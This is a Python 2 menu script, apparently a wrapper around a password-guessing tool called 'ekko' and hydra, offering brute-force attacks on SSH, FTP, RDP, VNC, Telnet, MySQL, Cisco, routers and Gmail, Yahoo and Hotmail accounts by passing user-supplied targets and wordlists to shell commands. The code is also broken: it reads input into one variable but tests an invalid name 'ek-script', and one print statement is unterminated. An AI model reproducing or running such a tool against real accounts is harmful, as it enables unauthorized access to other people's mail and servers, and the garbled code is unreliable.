#!/usr/bin/python
"""
This program is just a small program to shorten brute force sessions on ekko :)
But to be more satisfying results of the brute force. You better interact directly with ekko,
without having to use this ek-script console first: ').

ekko is needed for the process of this program :).
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")
print "___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____"
print "|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|"
print "|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  
print "-----------------------------------------------------"
print "[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
print " [*] Author: DedSecTL  ---  [*] Version 1.0"
print "c=={:::::::::::::::> ek-script Console"
print
print "              ===|[ Brute Force ]|==="
print
print "  [01] Cisco Brute Force         "
print "  [02] VNC Brute Force           "
print "  [03] FTP Brute Force           "
print "  [04] Gmail Brute Force         "
print "  [05] SSH Brute Force           "
print "  [06] TeamSpeak Brute Force     "
print "  [07] Telnet Brute Force        "
print "  [08] Yahoo Mail Brute Force    "
print "  [09] Hotmail Brute Force       "
print "  [10] Router Speedy Brute Force "
print "  [11] RDP Brute Force           "
print "  [12] MySQL Brute Force         "
print
print " [00] Exit"
print
bhydra = raw_input("[*] Ek-script > ")

if ek-script == '01' or ek-script == '1':
  print
  print "          +---------------------------+"
  print "          |     Cisco Brute Force     |"
  print "          +---------------------------+"
  print
  print
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif ek-script == '02' or ek-script == '2':
  print
  print "          +---------------------------+"
  print "          |      VNC Brute Force      |"
  print "          +---------------------------+"
  print
  print
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("ekko -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif ek-script == '03' or ek-script == '3':
  print
  print "          +------------------------------+"
  print "          |        FTP Brute Force       |"
  print "          +------------------------------+"
  print
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("ekko -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif ek-script == '04' or ek-script == '4':
  print
  print "          +------------------------------+"
  print "          |       Gmail Brute Force      |"
  print "          +------------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("ekko -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif ek-script == '05' or ek-script == '5':
   print
   print "         +--------------------------------+"
   print "         |        SSH Brute Force         |"
   print "         +--------------------------------+"
   print
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("ekko -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif ek-script == '06' or ek-script == '6':
	print
	print "        +-------------------------+"
	print "        |  TeamSpeak Brute Force  |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("ekko -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
	sys.exit()

elif ek-script == '07' or ek-script == '7':
	print
	print "        +-------------------------+"
	print "        |   Telnet Brute Force    |"
	print "        +-------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("ekko -l %s -P %s %s telnet" % (user, word, iphost))
	sys.exit()
	
elif ek-script == '08' or ek-script == '8':
  print
  print "          +---------------------------+"
  print "          |     Yahoo Brute Force     |"
  print "          +---------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("ekko -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif ek-script == '09' or ek-script == '9':
  print
  print "          +----------------------------+"
  print "          |    Hotmail Brute Force     |"
  print "          +----------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("ekko -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif ek-script == '10':
	print
	print "        +-----------------------------+"
	print "        |  Router Speedy Brute Force  |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("ekko -m / -l %s -P %s %s http-get" % (user, word, iphost))
	sys.exit()
	
elif ek-script == '11':
	print
	print "        +----------------------------+"
	print "        |      RDP Brute Force       |"
	print "        +----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	iphost = raw_input("[*] IP/Hostname : ")
	os.system("ekko -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
	sys.exit()
	
elif ek-script == '12':
	print
	print "        +-----------------------------+"
	print "        |       MySQL Brute Force     |"
	print "        +-----------------------------+"
	print
	print
	user = raw_input("[*] User : ")
	word = raw_input("[*] Wordlist : ")
	os.system("ekko -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif ek-script == '00' or ek-script == '0':
	print "\n[!] Exit the Program..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()